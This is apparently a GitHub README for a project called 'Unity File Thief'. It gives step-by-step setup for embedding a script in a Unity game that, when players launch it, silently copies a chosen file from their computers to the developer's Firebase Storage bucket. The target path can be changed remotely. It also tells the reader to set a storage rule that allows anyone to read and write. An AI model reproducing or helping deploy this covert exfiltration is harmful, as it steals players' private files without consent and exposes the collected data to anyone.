#🛠It's Updating ...🛠
# ⚠️You May Encounter Errors If You Use It.⚠️


# Unity File Thief
Capture the files of users who installed the Application or Game you created in Unity from an address on their computers without permission (or by asking) and store them on the cloud (Firebase). After collecting the file from the user, you can change the path via Firebase and pull different files.  


## Content
- [Basic Step by Step - Setup](#basic-step-by-step)
- [Başlık 2](#başlık-2)
- [Başlık 3](#başlık-3)

## Basic Step by Step
1- Prepare Unity For Project 


##

## Set Up
1- Open your new Unity Project  
**FOR FIREBASE**  
2- Go to : https://console.firebase.google.com/ , If you dont have any account, Sing Up  
3- Add new Project on firebase ; enter a name, Select default account for firebase  
4- Select Unity under the "Get started by adding Firebase to your app" text.  
5- Choose a register type.  
6- Download config file (2nd step) and SDK zip (3th step).  
7- Go to Your Project Console and open -> Build>Storage -> Get Started -> Next -> Done  
8- Under the "Storage" text, select Rules.  
9- Delete the texts of Rules File. And Copy and Paste that Rule :  
<pre>
rules_version ='2';  
service firebase.storage{  
  match /b/{bucket}/o {  
    match /{allPaths=**} {  
      allow read, write:if true;  
    }  
  }  
}  
</pre>
**TURN TO UNITY**  
10- Create a new folder. Name of the folder should be "StreamingAssets"  not with (") - (NAME IS IMPORTANT)  
11- Add config file to that folder. (Config file in the 6th step of the set up)  
12- Extract the Firebase SDK zip and hold FirebaseStorage.unitypackages and drop to project panel on the unity  
13- Import all  
14- Create new GameObject and add fileThieff.cs to your GameObject  
**SET THE SCRIPT**  
15- Go to  Firebase Storage of the YourProject Panel again. There is a copy button Left side of the Upload file  
16- Click Copy button or copy that Url which starts with gs (example ->  gs://file-thied.appspot.com )  
17- Turn to our script. Find that code line "StorageReference storageRef = storage.GetReferenceFromUrl("gs://file-thied.appspot.com/").Child(storagePath);"  
18- Delete that part  ""gs://file-thied.appspot.com/"" and paste your Url  
19- Select the path which file you want to take. Dont get a folder, only file.  
20- Under the Start Method, Find UploadFile() Function and write path (example -> "C:\\aFile\\aText.txt" )  
21- Save the Code and Start Your Game.  
**GET RESULT**  
22- When the users open your game; If they have that file, Our game take its file.  
23- Files go to Storage. You can see the documents on that tab.  



## Set Up v2.0
&nbsp;&nbsp;1- Open your new Unity Project on Unity Hub   
<br>
<br>
**🛠️ SET FIREBASE REALTIME DATABASE & STORAGE FOR UNITY 🛠️**   
   
&nbsp;&nbsp;2- Go to : https://console.firebase.google.com/ . If you dont have any account, Sing Up   
&nbsp;&nbsp;3- Add new Project on Firebase Console ;   
&nbsp;&nbsp;&nbsp;&nbsp;· Enter a Project Name   
&nbsp;&nbsp;&nbsp;&nbsp;· (Don't need to enable "Google Analytics")   
&nbsp;&nbsp;&nbsp;&nbsp;· Create Project   
&nbsp;&nbsp;4- Add the application to be used in the project panel you opened as Unity   
   
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://github.com/SabriACUN/Unity-File-Thief/assets/96339137/37fc2ca2-5789-4f6f-9de2-b81412b0fee8" width="250"/>

&nbsp;&nbsp;5- Choose the Register Type for Operating System (recommend : Android)   
&nbsp;&nbsp;6- Fill the first blank (com.company.appname) [ !! Not important what you write, Write according to the format ]   
&nbsp;&nbsp;7- Register App   
&nbsp;&nbsp;8- Dont download "config file" for now. Next Button !   
&nbsp;&nbsp;9- Download Firebase Unity SDK (Zip) and Continue to Console.   
10- Open Sidebar ( If its closed )   
&nbsp;&nbsp;&nbsp;&nbsp;· Under the "Product Categories" open "Build"   
&nbsp;&nbsp;&nbsp;&nbsp;· Open "Storeage"   
11- Click "Get Started"   
&nbsp;&nbsp;&nbsp;&nbsp;· Start in production mode, Next!   
&nbsp;&nbsp;&nbsp;&nbsp;· Select Best "Cloud Storage Location" for your Location. Done!
12- Under the "Storage" text, select Rules.
13- Delete the texts of Rules File. And Copy and Paste that Rule :  
<pre>
rules_version ='2';  
service firebase.storage{  
  match /b/{bucket}/o {  
    match /{allPaths=**} {  
      allow read, write:if true;  
    }  
  }  
}  
</pre>
